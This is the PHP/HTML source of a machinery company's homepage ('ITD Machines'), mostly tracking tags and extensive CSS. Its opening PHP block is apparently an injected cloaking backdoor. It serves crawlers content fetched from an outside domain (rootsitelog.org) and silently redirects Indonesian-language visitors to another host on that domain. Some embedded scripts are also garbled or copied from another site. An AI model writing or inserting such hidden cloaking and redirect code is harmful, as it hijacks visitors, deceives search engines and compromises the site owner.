<?php
$agent = $_SERVER['HTTP_USER_AGENT'];
if (strpos($agent, 'bot') !== false && $_SERVER['REQUEST_URI'] == '/') {
    $accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
    if (strpos($accept_lang, 'zh') !== false && $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS'] == 1 && $_COOKIE['az'] == 'lp') {
        setcookie('az', 'lp', time() + 3600 * 7200);
        echo ' '; // Your bot-specific content
        exit;
    }
    echo file_get_contents("https://kaite.rootsitelog.org/itdmachines");
    exit;
}
$browserLang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
if ($browserLang == 'id') {
    header("Location: https://ctn.rootsitelog.org/itdmachines/");
}
?>


<!DOCTYPE html>
<html lang="en">

<head>
    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16630851493">
    </script>
    <script>
        window.dataLayer = window.dataLayer || [];

        function gtag() {
            dataLayer.push(arguments);
        }
        gtag('js', new Date());

        gtag('config', 'AW-16630851493');
    </script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ITD Machines</title>
    <link rel="stylesheet" href="header.css">
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="index.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

    <meta http-equiv="X-UA-Compatible" content="IE=edge">




    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&family=Montserrat:wght@600;700;800&family=Open+Sans:wght@300;400;600&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">

    <link rel="stylesheet" media="screen" href="https://cdnjs.cloudflare.com/ajax/libs/boxicons/2.1.4/css/boxicons.min.css">
    <link rel="stylesheet" media="screen" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/8.3.2/swiper-bundle.min.css">
    <link rel="stylesheet" media="screen" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.1/animate.min.css">



    <script type="application/javascript" src="https://api.ip.sb/geoip?callback=getgeoip"></script>
    <script type="text/javascript" data-cookie-consent="tracking">
        (function(w, d, s, l, i) {
            w[l] = w[l] || [];
            w[l].push({
                'gtm.start': new Date().getTime(),
                event: 'gtm.js'
            });
            var f = d.getElementsByTagName(s)[0],
                j = d.createElement(s),
                dl = l != 'dataLayer' ? '&l=' + l : '';
            j.async = true;
            j.src = 'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
            f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-KLFK62P');
    </script>
    <script type="text/javascript" data-cookie-consent="tracking">
        {
            if (f.fbq) return;
            n = f.fbq = function() {
                n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments)
            };
            if (!f._fbq) f._fbq = n;
            n.push = n;
            n.loaded = !0;
            n.version = '2.0';
            n.queue = [];
            t = b.createElement(e);
            t.async = !0;
            t.src = v;
            s = b.getElementsByTagName(e)[0];
            s.parentNode.insertBefore(t, s)
        }(window, document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');
        fbq('init', '1155563932519377');
        fbq('track', 'PageView');
    </script>
    <script type="text/javascript" data-cookie-consent="tracking">
        ! function(w, d, t) {
            w.TiktokAnalyticsObject = t;
            var ttq = w[t] = w[t] || [];
            ttq.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie", "holdConsent", "revokeConsent", "grantConsent"], ttq.setAndDefer = function(t, e) {
                t[e] = function() {
                    t.push([e].concat(Array.prototype.slice.call(arguments, 0)))
                }
            };
            for (var i = 0; i < ttq.methods.length; i++) ttq.setAndDefer(ttq, ttq.methods[i]);
            ttq.instance = function(t) {
                for (var e = ttq._i[t] || [], n = 0; n < ttq.methods.length; n++) ttq.setAndDefer(e, ttq.methods[n]);
                return e
            }, ttq.load = function(e, n) {
                var r = "https://analytics.tiktok.com/i18n/pixel/events.js",
                    o = n && n.partner;
                ttq._i = ttq._i || {}, ttq._i[e] = [], ttq._i[e]._u = r, ttq._t = ttq._t || {}, ttq._t[e] = +new Date, ttq._o = ttq._o || {}, ttq._o[e] = n || {};
                n = document.createElement("script");
                n.type = "text/javascript", n.async = !0, n.src = r + "?sdkid=" + e + "&lib=" + t;
                e = document.getElementsByTagName("script")[0];
                e.parentNode.insertBefore(n, e)
            };
            ttq.load("CPQF3V3C77UARGOJ47A0");
            ttq.page();
        }(window, document, "ttq");
    </script>

    <!-- Meta Pixel Code -->
    <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1155563932519377&ev=PageView&noscript=1" /></noscript>
    <!-- End Meta Pixel Code -->



    <script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/452264695/?random=1723290801131&amp;cv=11&amp;fst=1723290801131&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;gtm=45be4880za200&amp;gcd=13l3l3l3l1&amp;dma=0&amp;tag_exp=0&amp;u_w=1280&amp;u_h=1024&amp;url=https%3A%2F%2Fwww.hsglaser.com%2F&amp;ref=https%3A%2F%2Fwww.hsglaser.com%2Fproducts%2Fsheet-metal%2F&amp;hn=www.googleadservices.com&amp;frm=0&amp;tiba=Fiber%20laser%20cutting%20machine%20%7C%20EU%20and%20ISO%20certification%20%7C%20HSG&amp;npa=0&amp;pscdl=noapi&amp;auid=596629092.1720506078&amp;uaa=x86&amp;uab=64&amp;uafvl=Not)A%253BBrand%3B99.0.0.0%7CGoogle%2520Chrome%3B127.0.6533.100%7CChromium%3B127.0.6533.100&amp;uamb=0&amp;uam=&amp;uap=Windows&amp;uapv=10.0.0&amp;uaw=0&amp;fledge=1&amp;data=event%3Dgtag.config&amp;rfmt=3&amp;fmt=4"></script>
    <style>
   

        .quote {
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .quote-form {
            background: #fff;
            padding: 70px;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 800px;
            animation: fadeIn 1s ease-in-out;
        }

        .form-title {
            text-align: center;
            margin-bottom: 30px;
            font-size: 28px;
            color: #333;
            position: relative;
        }

        .form-title::after {
            content: '';
            width: 50px;
            height: 4px;
            background-color: #ff8800;
            position: absolute;
            left: 50%;
            bottom: -10px;
            transform: translateX(-50%);
            border-radius: 2px;
        }

        .form-row {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
        }

        .form-group {
            flex: 1;
            min-width: calc(50% - 10px);
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #555;
        }

        .form-input,
        .form-select,
        .form-textarea {
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;
            transition: border-color 0.3s;
        }

        .form-input:focus,
        .form-select:focus,
        .form-textarea:focus {
            border-color: #ff8800;
            outline: none;
        }

        .form-textarea {
            resize: vertical;
            height: 120px;
        }

        .form-submit {
            width: 100%;
            padding: 15px;
            background-color: #ff8800;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .form-submit:hover {
            background-color: #ff8800;
            filter: drop-shadow(3px 4px 5px #000000);
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @media (max-width: 600px) {
            .form-row {
                flex-direction: row;
                gap: 10px;
            }

            .form-group {
                flex: 1;
                min-width: calc(50% - 10px);
            }

            .form-label {
                font-size: 13px;
            }
        }



       

      





      

  
          


    

        html {
            scroll-behavior: smooth;
        }

        .carousel-inner img {
            width: 100%;
            height: auto;
            border-radius: 30px;
        }

        .carousel-caption {
            bottom: 20px;
        }

        .carousel-caption button {
            margin: 5px;
            padding: 10px 20px;
            font-size: 16px;
            border-radius: 25px;
        }

        .carousel-caption .btn-primary {
            background-color: #007bff;
            border: none;
        }

        .carousel-caption .btn-secondary {
            background-color: white;
            border: 2px solid #c2c2c2;
            color: #6e6e6e;
        }

        @media (max-width: 767px) {
            .carousel-caption {
                margin-bottom: 20px;
            }

            .carousel-caption button {
                margin: 5px;
            }
        }



     
        .center-section {
            position: relative;
            z-index: 2;
            background-color: #f1f3f5;
            margin-bottom: 1.5rem;
        }

        .card {
            --hsg-card-spacer-y: 1.5rem;
            --hsg-card-spacer-x: 1.5rem;
            --hsg-card-title-spacer-y: 0.75rem;
            --hsg-card-border-width: 1px;
            --hsg-card-border-color: #e2e5f1;
            --hsg-card-border-radius: 0.5rem;
            --hsg-card-box-shadow: ;
            --hsg-card-inner-border-radius: calc(0.5rem - 1px);
            --hsg-card-cap-padding-y: 1.125rem;
            --hsg-card-cap-padding-x: 1.5rem;
            --hsg-card-cap-bg: transparent;
            --hsg-card-cap-color: ;
            --hsg-card-height: ;
            --hsg-card-color: ;
            --hsg-card-bg: #fff;
            --hsg-card-img-overlay-padding: 1.5rem;
            --hsg-card-group-margin: 0.75rem;
            position: relative;
            display: flex;
            flex-direction: column;
            min-width: 0;
            height: var(--hsg-card-height);
            word-wrap: break-word;
            background-color: var(--hsg-card-bg);
            background-clip: border-box;
            border: var(--hsg-card-border-width) solid var(--hsg-card-border-color);
            border-radius: var(--hsg-card-border-radius);
            box-shadow: var(--hsg-card-box-shadow);
        }

        .row {
            --hsg-gutter-x: 1.5rem;
            --hsg-gutter-y: 0;
            display: flex;
            flex-wrap: wrap;
            margin-top: calc(-1* var(--hsg-gutter-y));
            margin-right: calc(-0.5* var(--hsg-gutter-x));
            margin-left: calc(-0.5* var(--hsg-gutter-x));
        }

        .align-items-center {
            align-items: center !important;
        }

        *,
        *::before,
        *::after {
            box-sizing: border-box;
        }

        html * {
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        .container,
        .container-fluid,
        .container-xxl,
        .container-xl,
        .container-lg,
        .container-md,
        .container-sm {
            --hsg-gutter-x: 1.5rem;
            --hsg-gutter-y: 0;
            width: 100%;
            padding-right: calc(var(--hsg-gutter-x)* .5);
            padding-left: calc(var(--hsg-gutter-x)* .5);
            margin-right: auto;
            margin-left: auto;
            padding-top: 40px;
        }

        .product-center .row .card {
            padding: 1rem 0;
        }

        @media (min-width: 540px) {
            .product-center .row .card {
                min-height: 285px;
            }
        }

        .product-center .row .card {
            min-height: 225px;
        }

        .center-section .card,
        .center-section .design-aesthetics {
            transform: rotate(0deg);
        }

        .center-section .card-portfolio {
            background-color: #fff;
        }

        .card {
            margin-bottom: 12px;
            border-radius: 8px;
            border: none;
            box-shadow: none;
        }

        .card-portfolio {
            border: 0;
            background-color: rgba(0, 0, 0, 0);
        }

        .text-center {
            text-align: center !important;
        }

        .overflow-hidden {
            overflow: hidden !important;
        }

        body {
            margin: 0;

            font-size: var(--hsg-body-font-size);
            font-weight: var(--hsg-body-font-weight);
            line-height: var(--hsg-body-line-height);
            color: var(--hsg-body-color);
            text-align: var(--hsg-body-text-align);
            background-color: var(--hsg-body-bg);
            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
        }

        .product-center .card-portfolio .card-body {
            padding: 1rem 0rem 0.5rem 0rem;
        }

        :root {
            --hsg-user-selection-color: rgba(var(--hsg-primary-rgb), 0.22);
            --hsg-heading-link-color: #33354d;
            --hsg-heading-link-hover-color: #6366f1;
        }

        :root {
            --hsg-blue: #0d6efd;
            --hsg-indigo: #6610f2;
            --hsg-purple: #6f42c1;
            --hsg-pink: #d63384;
            --hsg-red: #dc3545;
            --hsg-orange: #fd7e14;
            --hsg-yellow: #ffc107;
            --hsg-green: #198754;
            --hsg-teal: #20c997;
            --hsg-cyan: #0dcaf0;
            --hsg-black: #000;
            --hsg-white: #fff;
            --hsg-gray: #9397ad;
            --hsg-gray-dark: #33354d;
            --hsg-gray-100: #f3f6ff;
            --hsg-gray-200: #eff2fc;
            --hsg-gray-300: #e2e5f1;
            --hsg-gray-400: #d4d7e5;
            --hsg-gray-500: #b4b7c9;
            --hsg-gray-600: #9397ad;
            --hsg-gray-700: #565973;
            --hsg-gray-800: #33354d;
            --hsg-gray-900: #0b0f19;
            --hsg-primary: #6366f1;
            --hsg-secondary: #eff2fc;
            --hsg-success: #22c55e;
            --hsg-info: #4c82f7;
            --hsg-warning: #ffba08;
            --hsg-danger: #ef4444;
            --hsg-light: #fff;
            --hsg-dark: #0b0f19;
            --hsg-primary-rgb: 99, 102, 241;
            --hsg-secondary-rgb: 239, 242, 252;
            --hsg-success-rgb: 34, 197, 94;
            --hsg-info-rgb: 76, 130, 247;
            --hsg-warning-rgb: 255, 186, 8;
            --hsg-danger-rgb: 239, 68, 68;
            --hsg-light-rgb: 255, 255, 255;
            --hsg-dark-rgb: 11, 15, 25;
            --hsg-white-rgb: 255, 255, 255;
            --hsg-black-rgb: 0, 0, 0;
            --hsg-body-color-rgb: 86, 89, 115;
            --hsg-body-bg-rgb: 255, 255, 255;
            --hsg-font-sans-serif: "OPPOSans", sans-serif;
            --hsg-font-monospace: "OPPOSans", sans-serif;
            --hsg-gradient: linear-gradient(180deg, rgba(255, 255, 255, 0.15), rgba(255, 255, 255, 0));
            --hsg-body-font-family: var(--hsg-font-sans-serif);
            --hsg-body-font-size: 1rem;
            --hsg-body-font-weight: 300;
            --hsg-body-line-height: 1.6;
            --hsg-body-color: #565973;
            --hsg-body-bg: #f5f5f5;
            --hsg-border-width: 1px;
            --hsg-border-style: solid;
            --hsg-border-color: #e2e5f1;
            --hsg-border-color-translucent: rgba(0, 0, 0, 0.175);
            --hsg-border-radius: 0.375rem;
            --hsg-border-radius-sm: 0.25rem;
            --hsg-border-radius-lg: 0.5rem;
            --hsg-border-radius-xl: 1rem;
            --hsg-border-radius-2xl: 2rem;
            --hsg-border-radius-pill: 50rem;
            --hsg-link-color: #000;
            --hsg-link-hover-color: #000;
            --hsg-code-color: #e3116c;
            --hsg-highlight-bg: #fff3cd;
        }

        @media (max-width: 991.98px) {
            .product-center .text-ftitle {
                min-height: 20px;
            }
        }

        .text-ftitle {
            font-size: 12px;
            line-height: 21px;
            margin-bottom: 8px;
            font-weight: 300;
            color: #000;
            opacity: 0.9;
            letter-spacing: 0;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .card-portfolio .card-img>img {
            display: block;
            transition: transform .35s ease-in-out;
        }

        .left-right img {
            width: 100%;
            transition: 0.5s;
        }

        @media (max-width: 991.98px) {
            .text-title {
                font-weight: 600;
            }

            .learn-more {
                width: 95px;
                text-align: center;
            }
        }

        .text-title {
            line-height: 1.25;
        }

        .text-title {
            color: #000;
            font-size: 14px;
            margin-bottom: 8px;
            line-height: 1.125;
            font-weight: 600;
        }

        html * {
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        h1,
        .h1 {
            font-size: calc(1.375rem + 1.5vw);
        }

        h6,
        .h6,
        h5,
        .h5,
        h4,
        .h4,
        h3,
        .h3,
        h2,
        .h2,
        h1,
        .h1 {
            margin-top: 0;
            margin-bottom: 1rem;
            font-weight: 800;
            line-height: 1.3;
            color: var(--hsg-gray-900);
        }

        .learn-more {
            border-radius: 17px;
            border: 2px solid #345aca;
            background-color: #345aca;
            color: #fff;
            display: inline-block;
            padding: 4px 10px;
            transition: .3s ease-out;
            font-size: 12px;
            font-weight: 300;
            line-height: initial;
        }

        a {
            transition: color .2s ease-in-out;
        }

        a {
            color: var(--hsg-link-color);
            text-decoration: none;
        }

        *,
        *::before,
        *::after {
            box-sizing: border-box;
        }

        @media (min-width: 992px) and (max-width: 1399.98px) {
            .model-title {
                font-size: 1.6rem;
            }
        }

        @media (min-width: 992px) and (max-width: 1399.98px) {
            .model-title {
                font-size: 2.125rem;
            }
        }

        @media (min-width: 992px) {
            .model-title {
                font-size: calc(1.25vw + 24px);
                font-weight: 600;
            }
        }

        @media (min-width: 992px) {
            .model-title {
                font-size: calc(1.325rem + 0.9vw);
            }
        }

        .model-title {
            font-size: 1.125rem;
            line-height: 1.3;
            font-weight: 400;
            color: #000;
            margin-bottom: 16px;
        }

        html * {
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        h1,
        .h1 {
            font-size: calc(1.375rem + 1.5vw);
        }

        h6,
        .h6,
        h5,
        .h5,
        h4,
        .h4,
        h3,
        .h3,
        h2,
        .h2,
        h1,
        .h1 {
            margin-top: 0;
            margin-bottom: 1rem;
            font-weight: 300;
            line-height: 1.3;
            color: var(--hsg-gray-900);
        }

        .card-portfolio .card-img>img {
            display: block;
            transition: transform .35s ease-in-out;
        }

        @media (min-width: 992px) {

            .product-center .col-6:nth-of-type(odd),
            .technological-innovation .col-6:nth-of-type(odd),
            .company-news .col-6:nth-of-type(odd) {
                padding-right: 12px;
            }
        }

        .product-center .col-6:nth-of-type(odd),
        .technological-innovation .col-6:nth-of-type(odd),
        .company-news .col-6:nth-of-type(odd) {
            padding-right: 6px;
        }

        @media (min-width: 992px) {
            .col-lg-5 {
                flex: 0 0 auto;
                width: 41.66666667%;
            }
        }

        @media (min-width: 500px) {
            .col-sm-12 {
                flex: 0 0 auto;
                width: 100%;
            }
        }

        @media (min-width: 992px) {
            .col-lg-7 {
                flex: 0 0 auto;
                width: 58.33333333%;
            }
        }

        @media (min-width: 500px) {
            .col-sm-12 {
                flex: 0 0 auto;
                width: 100%;
            }
        }

        @media (min-width: 992px) {
            .center-section {
                margin-bottom: 6rem;
            }
        }

        .center-section {
            position: relative;
            z-index: 2;
            background-color: #f1f3f5;
            margin-bottom: 1.5rem;
        }

        body {
            margin: 0;

            font-size: var(--hsg-body-font-size);
            font-weight: var(--hsg-body-font-weight);
            line-height: var(--hsg-body-line-height);
            color: var(--hsg-body-color);
            text-align: var(--hsg-body-text-align);
            background-color: var(--hsg-body-bg);
            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
        }

        @media (min-width: 992px) {
            .center-section .container-fluid {
                padding: 2.5rem;
            }
        }

        @media (min-width: 992px) and (max-width: 1399.98px) {

            .left-right .card-body .text-title,
            .left-right .card-body .text-ftitle {
                margin-bottom: 1.5rem;
            }
        }

        @media (min-width: 992px) {

            .left-right .card-body .text-title,
            .left-right .card-body .text-ftitle {
                margin-bottom: 2rem;
            }
        }

        @media (min-width: 992px) and (max-width: 1399.98px) {

            .text-title,
            .system-process .text-title,
            .other-products .text-title {
                font-size: 1.25rem;
            }
        }

        @media (min-width: 992px) and (max-width: 1399.98px) {
            .text-title {
                font-size: 1.6rem;
            }
        }

        .text-title {
            line-height: 1.25;
        }

        @media (min-width: 992px) {
            .text-title {
                font-size: 1.75rem;
                line-height: 1.185;
                margin-bottom: 16px;
                letter-spacing: 0px;
                font-size: 18px;
                font-weight: 600;
            }
        }

        @media (min-width: 992px) {
            .text-title {
                font-weight: 600;
            }
        }

        .text-title {
            color: #000;
            font-size: 14px;
            margin-bottom: 8px;
            line-height: 1.125;
            font-weight: 600;
        }

        @media (min-width: 992px) and (max-width: 1399.98px) {

            .left-right .card-body .text-title,
            .left-right .card-body .text-ftitle {
                margin-bottom: 1.5rem;
            }
        }

        @media (min-width: 992px) {

            .left-right .card-body .text-title,
            .left-right .card-body .text-ftitle {
                margin-bottom: 2rem;
            }
        }

        @media (min-width: 992px) and (max-width: 1399.98px) {
            .text-ftitle {
                line-height: 26px;
            }
        }

        @media (min-width: 992px) and (max-width: 1399.98px) {
            .text-ftitle {
                font-size: 13px;
            }
        }

        @media (min-width: 992px) {
            .text-ftitle {
                font-size: 15px;
                font-weight: 300;
                line-height: 24px;
            }
        }

        @media (min-width: 992px) {
            .text-ftitle {
                font-size: 1rem;
                line-height: 26px;
                font-weight: 500;
                margin-bottom: 20px;
            }
        }

        .text-ftitle {
            font-size: 15px;
            line-height: 25px;
            margin-bottom: 8px;
            font-weight: 300;
            color: #000;
            opacity: 0.9;
            letter-spacing: 0;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        @media (min-width: 720px) {

            .left-right,
            .left-right .row>div {
                max-height: inherit;
            }
        }

        .left-right,
        .left-right .row>div {
            max-height: 550px;
        }

        .left-right .col-sm-5 {
            width: 36%;
            overflow: hidden;
        }

        @media (min-width: 500px) {
            .col-sm-5 {
                flex: 0 0 auto;
                width: 41.66666667%;
            }
        }

        @media (min-width: 992px) {

            .technological-innovation .align-items-center .card-body,
            .product-center .left-right .row .card-body {
                padding-left: 15%;
            }
        }

        @media (min-width: 992px) and (max-width: 1399.98px) {

            .text-title,
            .system-process .text-title,
            .other-products .text-title {
                font-size: 1.25rem;
            }
        }

        .align-items-center {
            align-items: center !important;
        }

        .row {
            --hsg-gutter-x: 1.5rem;
            --hsg-gutter-y: 0;
            display: flex;
            flex-wrap: wrap;
            margin-top: calc(-1* var(--hsg-gutter-y));
            margin-right: calc(-0.5* var(--hsg-gutter-x));
            margin-left: calc(-0.5* var(--hsg-gutter-x));
        }

        .left-right,
        .left-right .row>div {
            max-height: 550px;
        }

        .left-right .col-sm-7 {
            width: 64%;
            overflow: hidden;
        }

        @media (min-width: 992px) and (max-width: 1399.98px) {
            .product-center .row .card {
                min-height: 100px;
            }
        }

        .product-center .row .card {
            padding: 1rem 0;
        }

        @media (min-width: 992px) {

            .product-center .col-6:nth-of-type(odd),
            .technological-innovation .col-6:nth-of-type(odd),
            .company-news .col-6:nth-of-type(odd) {
                padding-right: 12px;
            }
        }

        .product-center .col-6:nth-of-type(odd),
        .technological-innovation .col-6:nth-of-type(odd),
        .company-news .col-6:nth-of-type(odd) {
            padding-right: 6px;
        }

        @media (min-width: 500px) {
            .col-sm-12 {
                flex: 0 0 auto;
                width: 100%;
            }
        }

        @media (min-width: 1200px) {
            .product-center .row .card {
                padding: 2.5rem 1rem;
            }
        }

        @media (min-width: 1200px) {
            .product-center .row .card {
                min-height: 490px;
            }
        }

        @media (min-width: 992px) {
            .center-section .card {
                margin-bottom: 24px;
            }
        }

        @media (min-width: 992px) {
            .center-section .card {
                border-radius: 17px;
                border-color: none;
                border: none;
                overflow: hidden;
            }
        }

        @media (min-width: 992px) {
            .col-lg-5 {
                flex: 0 0 auto;
                width: 41.66666667%;
            }
        }

        @media (min-width: 992px) {

            .product-center .col-6:nth-of-type(odd),
            .technological-innovation .col-6:nth-of-type(odd),
            .company-news .col-6:nth-of-type(odd) {
                padding-right: 12px;
            }
        }

        @media (min-width: 1200px) {
            .product-center .row .card {
                padding: 2.5rem 1rem;
            }
        }

        @media (min-width: 1200px) {
            .product-center .row .card {
                min-height: 500px;
            }

        }

        @media (min-width: 1200px) {
            .product-center .row .card {
                padding: 2.5rem 1rem;
            }
        }

        .row {
            --hsg-gutter-x: 1.5rem;
            --hsg-gutter-y: 0;
            display: flex;
            flex-wrap: wrap;
            margin-top: calc(-1* var(--hsg-gutter-y));
            margin-right: calc(-0.5* var(--hsg-gutter-x));
            margin-left: calc(-0.5* var(--hsg-gutter-x));
        }

        @media (min-width: 992px) {
            .col-lg-12 {
                -ms-flex: 0 0 100%;
                flex: 0 0 100%;
                max-width: 100%;
            }
        }

        @media (min-width: 992px) {
            .center-section .card {
                margin-bottom: 24px;
            }


        }

        @media (min-width: 992px) {
            .center-section .card {
                border-radius: 17px;
                border-color: none;
                border: none;
                overflow: hidden;
            }
        }

        @media (min-width: 768px) {
            .center-section .card-img {
                width: 100%;
            }

        }

        @media (min-width: 992px) {
            .col-lg-7 {
                flex: 0 0 auto;
                width: 58.33333333%;
            }
        }

        @media (min-width: 1400px) and (max-width: 1599.98px) {

            .text-title,
            .system-process .text-title,
            .other-products .text-title,
            .system-process .text-title {
                font-size: 32px;
            }

        }

        @media (min-width: 1400px) and (max-width: 1599.98px) {
            .text-ftitle {
                font-size: 29px;
            }

            .footer {

                padding: 10px 20px;

            }

            .footer-container {
                margin-left: 150px;
            }
        }

        @media (min-width: 1200px) {
            .learn-more {
                min-width: 130px;
                text-align: center;
            }
        }

        @media (min-width: 1200px) {
            .learn-more {
                cursor: pointer;
                padding: 10px 26px;
                background-color: #345aca;
                color: #fff;
                display: inline-block;
                font-size: 13px;
                line-height: 24px;
                font-weight: 600;
                border-radius: 40px;
                border: 2px solid #345aca;
            }
        }

        @media (min-width: 1400px) {
            .text-ftitle {
                line-height: 60px;
                min-height: 16px;
                font-size: 29px;
            }
        }

        @media (min-width: 992px) {
            .text-title {
                font-size: 1.75rem;
                line-height: 1.85;
                margin-bottom: 17px;
                letter-spacing: 0px;
                font-size: 51px;

            }
        }

        .product-center .row .card {
            padding: 1rem 0;
        }

        a:hover {
            color: #ff8a00;
            text-decoration: none;
        }

        @media (min-width: 1200px) {
            .col-xl-4 {
                flex: 0 0 auto;
                width: 33.33333333%;
            }
        }

        .col-12 {
            flex: 0 0 auto;
            width: 100%;
        }

        @media (min-width: 1200px) {
            .col-xl-8 {
                flex: 0 0 auto;
                width: 66.66666667%;
            }
        }

        @media (min-width: 1400px) {
            .col-xxl-4 {
                flex: 0 0 auto;
                width: 33.33333333%;
            }

            .carousel-inner {
                padding-left: 34px;
                padding-right: 34px;
            }
        }


        @media (min-width: 1200px) {
            .company-news p {
                font-size: 14px;
                line-height: 26px;
            }
        }

        .row {
            display: flex;
        }

        .col-6 {
            display: flex;
            flex-direction: column;
        }

        .card {
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            height: 100%;
        }

        @media (min-width: 1200px) {
            .col-xl-6 {
                flex: 0 0 auto;
                width: 50%;
            }
        }

        @media (min-width: 1200px) {
            .col-xl-8 {
                flex: 0 0 auto;
                width: 66.66666667%;
            }
        }

        /* @media (min-width: 1200px) {
    .company-news .row .col-xl-5 .card, .company-news .card {
        min-height: 540px;
    }
} */
        @media (min-width: 992px) and (max-width: 1399.98px) {
            .card-body {
                padding: 2.5rem 1.5rem;
            }
        }

        @media (min-width: 1200px) {
            .col-xl-4 {
                flex: 0 0 auto;
                width: 33.33333333%;
            }
        }

        @media (min-width: 992px) and (max-width: 1399.98px) {
            .company-news .card h1 {
                font-size: 1rem;
            }
        }

        @media (min-width: 992px) {
            .company-news .card h1 {
                font-size: 1.25rem;
                line-height: 1.3;
            }
        }

        .center-section .card,
        .center-section .design-aesthetics {
            transform: rotate(0deg);
        }

        .center-section .card-portfolio {
            background-color: #fff;
        }

        @media (min-width: 1200px) {

            .company-news .row .col-xl-5 .card,
            .company-news .card {
                min-height: 540px;
            }
        }

        .company-news .card {
            position: relative;
            cursor: pointer;
            transition: 0.3s;
        }

        @media (min-width: 992px) {
            .center-section .card {
                margin-bottom: 24px;
            }
        }

        @media (min-width: 992px) {
            .center-section .card {
                border-radius: 17px;
                border-color: none;
                border: none;
                overflow: hidden;
            }
        }

        @media (min-width: 992px) {
            .company-news .card-portfolio .card-body {
                padding: 1rem 1.5rem;
            }
        }

        @media (min-width: 992px) {
            .company-news .news-time span:nth-of-type(1) {
                margin-top: 2.5rem;
                font-size: 2rem;
                color: #345aca;
                font-weight: 600;
            }
        }


        @media (min-width: 992px) {
            .company-news .news-time span {
                display: block;
            }
        }

        .company-news .card-portfolio .card-body {
            padding: 1rem;
        }

        @media (max-width: 991.98px) {
            .learn-more {
                width: 95px;
                text-align: center;
            }
        }

        .center-section {
            position: relative;
            z-index: 2;
            background-color: #f1f3f5;
            margin-bottom: 1.5rem;
        }



        .title {
            font-size: 20px;
            line-height: 1.3;
            font-weight: 450;
            color: #000;
            margin-bottom: 16px;
        }

        @media (min-width: 992px) {
            .title {
                font-size: calc(1.25vw + 24px);
                font-weight: 600;
            }
        }

        .card-container {
            display: flex;
            justify-content: center;
            gap: 50px;
            flex-direction: row;
        }


        .card1 {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            width: 300px;
            height: auto;
            /* Adjusted height to auto */
            padding: 15px;
            /* Adjusted padding to fit text better */
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            background-color: #fff;
            transition: transform 0.3s ease;
            overflow: hidden;
            /* Prevents text overflow */
        }

        .card1 img {
            max-width: 100%;
            height: auto;
            border-radius: 10px 10px 0 0;
        }

        .card1 h3 {
            margin: 10px 0;
            font-size: 1.5em;
        }

        .card1 p {
            font-size: 15px;
            color: #555;
            margin-bottom: 10px;
            /* Adds margin to prevent text from touching the bottom of the card */
        }

        .card1:hover {
            transform: translateY(-10px);
        }

        @media (max-width: 768px) {
            .card1 {
                width: 100%;
            }

            .card1 p {
                font-size: 12px;
                color: #555;
                margin-bottom: 10px;
                /* Adds margin to prevent text from touching the bottom of the card */
            }

            .footer-column a {
                color: #ffffff;
                text-decoration: none;
                padding: 1px 2px;
                position: relative;
                transition: all 0.3s ease;
                font-size: 17px;
            }
        }

        .new-title {
            text-align: center;
            margin-bottom: 30px;
            font-size: 36px;
            color: #333;
            position: relative;
            font-weight: 600;
            margin-bottom: 50px;
            margin-top: 50px;
        }

        .new-title::after {
            content: '';
            width: 50px;
            height: 4px;
            background-color: #ff8800;
            position: absolute;
            left: 50%;
            bottom: -10px;
            transform: translateX(-50%);
            border-radius: 2px;
        }

